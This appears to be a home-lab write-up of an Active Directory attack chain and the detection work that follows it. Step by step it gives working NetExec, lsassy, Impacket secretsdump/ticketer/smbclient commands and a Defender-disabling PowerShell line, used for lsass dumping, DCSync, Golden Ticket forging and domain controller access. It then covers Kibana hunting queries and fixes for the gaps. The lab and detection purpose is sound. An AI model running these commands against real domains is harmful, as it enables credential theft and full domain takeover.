# Phase 4: Persistence via DCSync and Golden Ticket

This is the phase everything else built toward. I took the access I'd gained in [Phase 3](../Phase-3-Lateral-Movement) and used it to extract the `krbtgt` hash from my Domain Controller, forge a Kerberos ticket offline, and authenticate to the DC with no password at all. Then I went to look for it in my SIEM and found almost nothing.

The last part is the point of the phase. DCSync and Golden Ticket are known to be hard for host-based logging to catch, so I picked them deliberately to find out exactly where my visibility ends.

```
j.jenkins (local admin via GPO misconfiguration - Phase 3)
    → Pwn3d! on MY-LAB-PC via NetExec SMB
        → Joshua\Administrator active session found in lsass
            → Defender blocked lsassy and handlekatz
                → Defender disabled (local admin right)
                    → lsassy extracts Administrator NTLM hash
                        → DCSync via Pass-the-Hash
                            → krbtgt NTLM + AES256 keys extracted
                                → Golden Ticket forged (offline)
                                    → Full DC access - zero passwords used
```

## What I used

| | |
|---|---|
| Attack | Impacket (`secretsdump`, `ticketer`, `smbclient`, `lookupsid`), NetExec with the lsassy module |
| Targets | Windows Server 2022 DC `joshua.local`, Windows 10 `MY-LAB-PC` |
| Detection | Elastic Stack 8.12, Winlogbeat 8.12, Sysmon (SwiftOnSecurity config), Windows Defender |
| Attacker | Kali Linux (`192.168.18.70`) |

## How it went

### Step 1: Confirm access and find a target session

First I needed to confirm `j.jenkins` still had `Pwn3d!` access, and that a Domain Admin session was actually live in memory on `MY-LAB-PC`.

```bash
# Confirm SMB access
netexec smb 192.168.18.142 -u j.jenkins -p '<redacted>'

# Check for active DA sessions
netexec smb 192.168.18.142 -u j.jenkins -p '<redacted>' --loggedon-users
```

`Pwn3d!` confirmed, and `Joshua\Administrator` showed up as an active session. A Domain Admin with a live session on a workstation is exactly the misconfiguration that makes the rest of this possible.

One thing cost me time here. After a reboot, `MY-LAB-PC`'s network profile had flipped back to `Public`, which blocked all inbound SMB even though the Domain-profile firewall rules were correct. I set it back to `Private` with PowerShell. Firewall rules do nothing if the wrong profile is active.

### Step 2: Get past Defender and dump NTLM from lsass

Three tools failed against active Defender before I got anything:

| Tool | Result | Reason |
|------|--------|--------|
| lsassy | Blocked at dump | Defender killed the process |
| nanodump | Architecture mismatch | Wrong binary for this OS build |
| handlekatz | Blocked mid-dump | Defender terminated after copy |

I disabled Defender's real-time monitoring, which I could only do because I already had local admin:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Then lsassy worked:

```bash
netexec smb 192.168.18.142 -u j.jenkins -p '<redacted>' -M lsassy
```

```
LSASSY   Saved 5 Kerberos ticket(s) to /home/kaliadmin/.nxc/modules/lsassy
LSASSY   Joshua\Administrator  203076xxxxxxxxxxxxxxxxxxx
```

The takeaway: EDR was the only reliable control against lsass dumping here, and it needed both local admin and a manual bypass to get past. My SIEM saw none of this.

### Step 3: DCSync via Pass-the-Hash

With the Administrator NTLM hash I ran DCSync. No plaintext password, no interactive logon to the DC.

```bash
impacket-secretsdump \
  -just-dc-user krbtgt \
  -hashes :2030xxxxxxxxxxxxxxxxxxxxxxxx \
  joshua.local/Administrator@192.168.18.50
```

```
krbtgt:502:aad3b435b<redacted>:24895xxxxxxxxxxxxxxxxxxx:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:b7e5dxxxxxxxxxxxxxxxxxxxxxx
krbtgt:aes128-cts-hmac-sha1-96:af828xxxxxxxxxxxxxxxxxxxxxx
```

I also pulled the domain SID, which I'd need to forge a ticket:

```bash
impacket-lookupsid \
  -hashes :2030 '<redacted>' \
  joshua.local/Administrator@192.168.18.50
```

```
[*] Domain SID is: S-1-5-21-18113xxxxxxxxxxxxxxxxxxx
```

At this point the whole domain's Kerberos trust is in my hands. Administrator's password no longer matters. It could be changed to 64 random characters and the attack would carry on.

### Step 4: Forging the Golden Ticket took three tries

**First try, a fake account.** This is what most tutorials show.

```bash
impacket-ticketer \
  -nthash 24895<redacted> \
  -domain-sid S-1-5-21-18113xxxxxxxxxxxxxxxxxxx \
  -domain joshua.local fake_admin
```

`KDC_ERR_TGT_REVOKED`. The cause is CVE-2021-42287, patched in November 2021: Server 2022 checks that the account in the ticket's PAC actually exists in AD. A made-up account is rejected on sight. On a pre-2021 DC this works fine, which is why so much public content still shows it.

**Second try, RC4 with the NTLM hash, against a real account.** Same error. The domain enforces AES-only Kerberos, the same policy I ran into during Kerberoasting in Phase 1. RC4 tickets are rejected regardless.

**Third try, AES256 key with a real account.**

```bash
impacket-ticketer \
  -aesKey b7e5dxxxxxxxxxxxxxxxxxxx \
  -domain-sid S-1-5-21-1811xxxxxxxxxxxxxxxxxxx \
  -domain joshua.local \
  -duration 10 \
  Administrator
```

```
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for joshua.local/Administrator
[*] Signing/Encrypting final ticket
[*] Saving ticket in Administrator.ccache
```

### Step 5: Using the ticket

```bash
# Load forged ticket into Kerberos environment
export KRB5CCNAME=/home/kaliadmin/Desktop/Administrator.ccache

# Authenticate to DC - zero passwords
impacket-smbclient \
  -k -no-pass \
  -dc-ip 192.168.18.50 \
  joshua.local/Administrator@joshua-server2022.joshua.local
```

```
ACCOUNTING    ADMIN$    C$       CertEnroll    HR
IPC$          IT        MANAGEMENT             NETLOGON
SALES         SharedFolders      SYSVOL        Wallpaper
```

`C$`, `ADMIN$` and `SYSVOL` were all accessible. Full domain compromise, with no password used at any point after the initial `j.jenkins` credential from Phase 1.

### Step 6: Hunting it in Kibana

This is where I expected to find evidence and mostly didn't.

**DCSync (4662 with replication GUIDs):**

```kql
event.code: "4662"
AND winlog.event_data.Properties: *1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*
```

0 hits. Directory Service Access auditing wasn't configured, so DCSync produced nothing.

**Golden Ticket TGS request (4769):**

```kql
event.code: "4769"
AND winlog.event_data.TargetUserName: "Administrator"
```

0 hits. The events existed in the Windows Security log, but Winlogbeat's registry was in a bad state during the attack window and never shipped them. By the time I fixed it, the log had rolled over.

**The resulting logon from Kali (4624):**

```kql
event.code: "4624"
AND winlog.event_data.LogonType: "3"
AND source.ip: "192.168.18.70"
```

1 hit. A single, completely normal-looking Type 3 Kerberos network logon. No anomaly, nothing to distinguish it from a legitimate admin logging in.

## The detection gap

```
Attack Stage          | Logged? | Why
──────────────────────────────────────────────────────────
NTLM Hash Extraction  | No      | Defender killed, then disabled
DCSync (4662)         | No      | DS Access audit not configured
Ticket Forge          | No      | Happened offline on attacker box
TGS Request (4769)    | No      | Pipeline gap during attack window
Resulting Logon (4624)| One     | Normal-looking Kerberos logon only
──────────────────────────────────────────────────────────
```

A complete domain compromise left one artifact: a Kerberos network logon indistinguishable from legitimate admin activity. Catching this class of attack needs more than a well-configured host-based SIEM. It needs Directory Service Access auditing turned on, network-layer sensors (Zeek or Suricata), cross-event correlation (a 4769 with no preceding 4768), or a dedicated identity product like Microsoft Defender for Identity.

## What I learned

- **The `krbtgt` hash is different in kind from any other credential.** Every other credential gives you what that account can reach. `krbtgt` lets me impersonate anyone in the domain, at any privilege level, indefinitely.
- **A modern patched domain breaks the classic playbook.** Two things that "always work" in tutorials failed here: fake accounts (CVE-2021-42287) and RC4 tickets (AES-only policy). The gap between reading about Golden Tickets and doing one against a patched Server 2022 is real.
- **EDR changes credential dumping entirely.** Three lsass tools failed with Defender active. The attack only worked after I disabled it, which itself depended on a separate misconfiguration giving me local admin.
- **Logging without auditing is not detection.** The DC was logging, Winlogbeat was running, ELK was ingesting. But with DS Access auditing off, DCSync produced zero events. The infrastructure was there; the configuration wasn't.
- **Pipeline health is a detection dependency.** A Winlogbeat registry problem erased the one window where the 4769 events existed. Retention and shipper health aren't just operational concerns, they decide whether evidence survives.
- **Tiering isn't optional.** A Domain Admin logging into a workstation is the single thing that made this whole chain possible.

## What I'd do next

| Gap | Fix |
|-----|-----|
| DCSync invisible | Enable Directory Service Access auditing for 4662 with replication GUIDs |
| lsass dump invisible | Add a Sysmon Event ID 10 ProcessAccess rule targeting lsass.exe |
| Golden Ticket no alert | Build a 4769-without-preceding-4768 correlation rule |
| Defender disabled silently | Alert on `DisableRealtimeMonitoring` registry changes (Sysmon EID 13) |
| No network detection | Deploy Zeek or Suricata on a SPAN port |
| No identity coverage | Evaluate Microsoft Defender for Identity for Tier 0 |

Beyond detection, I'd move all lab VMs to static IPs (DHCP lease changes caused several false-start troubleshooting sessions), add a Kibana alert for "no events from Joshua-Server2022 in the last 15 minutes" so a pipeline gap surfaces immediately, document and test the two-pass `krbtgt` rotation before I ever need it, and enable Credential Guard on Tier 1/2 systems to make this dump technique impossible outright.

## Evidence

Hashes are truncated, and credentials, internal IPs outside the lab range and personal details are redacted. I deliberately did not include any screenshot showing a full credential hash.

**lsassy extracting the Administrator NTLM hash after Defender was disabled**
<img width="538" height="318" alt="Administrator NTLM Hash" src="https://github.com/user-attachments/assets/ad0943ee-2780-4385-8491-5aef34192826" />

**DCSync output: krbtgt keys extracted via Pass-the-Hash, no interactive DC logon**
<img width="500" height="158" alt="DCSync" src="https://github.com/user-attachments/assets/988bdd79-d0a8-4552-9607-a858c9207b02" />

**Domain SID and account enumeration from a single `lookupsid` RPC call**
<img width="468" height="382" alt="Domain SID" src="https://github.com/user-attachments/assets/9aaa1ba3-8aa4-44d5-88be-c712a7549142" />

**Golden Ticket forged offline, signed with the krbtgt AES256 key**
<img width="472" height="262" alt="Golden Ticket Forged" src="https://github.com/user-attachments/assets/a1e8cde2-df29-4a51-be37-b53ca81c234f" />

**`describeTicket` confirming a valid TGT: Administrator, krbtgt/JOSHUA.LOCAL, 10-hour lifetime**
<img width="538" height="251" alt="Golden DescribeTicket" src="https://github.com/user-attachments/assets/8d7f650c-aa57-4b21-a545-b15412efcd1f" />

**Full DC share access over the forged ticket, Kerberos only, no password**
<img width="539" height="376" alt="Full DC Share Access" src="https://github.com/user-attachments/assets/dded24e1-0295-4b42-9506-6574810d2eba" />

**Kibana: zero 4662 events across the DCSync window, the confirmed detection gap**
<img width="642" height="659" alt="No event hit 4662" src="https://github.com/user-attachments/assets/e9ae43d1-8bf4-40f6-8aaa-d92431de21b3" />

**Kibana: the one surviving artifact, a Type 3 Kerberos logon from the Kali box with no preceding 4768**
<img width="640" height="702" alt="event 4624 kerberos" src="https://github.com/user-attachments/assets/a750ec93-8ac2-4586-8d1a-74c845b2459f" />

## MITRE ATT&CK coverage

| Technique | ID | Tool |
|-----------|-----|------|
| OS Credential Dumping: LSASS Memory | T1003.001 | lsassy |
| OS Credential Dumping: DCSync | T1003.006 | impacket-secretsdump |
| Steal or Forge Kerberos Tickets: Golden Ticket | T1558.001 | impacket-ticketer |
| Pass the Hash | T1550.002 | impacket-secretsdump |
| Remote Services: SMB/Windows Admin Shares | T1021.002 | impacket-smbclient |
| Impair Defenses: Disable or Modify Tools | T1562.001 | Set-MpPreference |

---

Previous: [Phase 3](../Phase-3-Lateral-Movement) · Next: [Phase 5: Detection Engineering](../Phase-5-Detection-Engineering) · Back to the [lab overview](../README.md)

*Everything here ran in a private, isolated lab I own. No production systems or real user data were involved.*
